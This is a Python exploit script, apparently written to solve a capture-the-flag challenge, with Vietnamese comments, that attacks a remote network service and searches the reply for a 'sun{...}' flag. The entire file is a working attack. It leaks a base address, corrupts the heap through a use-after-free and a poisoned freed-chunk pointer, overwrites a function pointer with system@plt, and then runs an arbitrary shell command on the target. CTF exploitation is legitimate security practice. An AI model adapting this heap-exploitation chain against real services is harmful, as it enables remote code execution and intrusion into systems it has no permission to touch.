"""Thăm dò: sau khi ghi system@plt vào 0x40c0, lệnh có chạy thật không?

Dùng: python analysis/probe_run.py "sleep 4"
"""
import re
import socket
import struct
import sys
import time

sys.path.insert(0, ".")
import client as C  # noqa: E402

S = 0x100


def main():
    cmd = sys.argv[1].encode() if len(sys.argv) > 1 else b"id"
    s = socket.create_connection((C.HOST, C.PORT), timeout=30)
    ch, ok = C.handshake(s)
    assert ok
    dump = ch.cmd(b"\x16")[2:]
    base = struct.unpack("<Q", dump[:8])[0] - 0x1390
    FNPG, SYS = base + 0x40C0, base + 0x1150

    ch.cmd(b"\x10\x01" + struct.pack(">H", S) + b"A" * S)          # put1
    ch.cmd(b"\x14\x00\x01")                                        # alias 0<-1
    ch.cmd(b"\x13\x01")                                            # free1
    g = ch.cmd(b"\x11\x00")
    m = struct.unpack("<Q", g[4:12])[0]
    ch.cmd(b"\x12\x00" + struct.pack(">H", 8) + struct.pack("<Q", m ^ FNPG))
    ch.cmd(b"\x10\x02" + struct.pack(">H", S) + b"B" * S)
    r = ch.cmd(b"\x10\x03" + struct.pack(">H", S) + struct.pack("<Q", SYS) + b"\x00" * (S - 8))
    print("[*] set fnptr -> system@plt, put3 status=%s" % r[:2].hex())

    t0 = time.time()
    ch.send(b"\x15" + cmd)
    # đọc thô, không giả định có header độ dài
    s.settimeout(8)
    buf = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            buf += c
    except socket.timeout:
        pass
    dt = time.time() - t0
    print("[*] %.2fs, %d byte:" % (dt, len(buf)))
    print(repr(buf[:600]))
    f = re.search(rb"sun\{[^}\n]*\}", buf)
    print("[+] FLAG: %s" % f.group().decode() if f else "[-] chưa có flag")
    s.close()


if __name__ == "__main__":
    main()
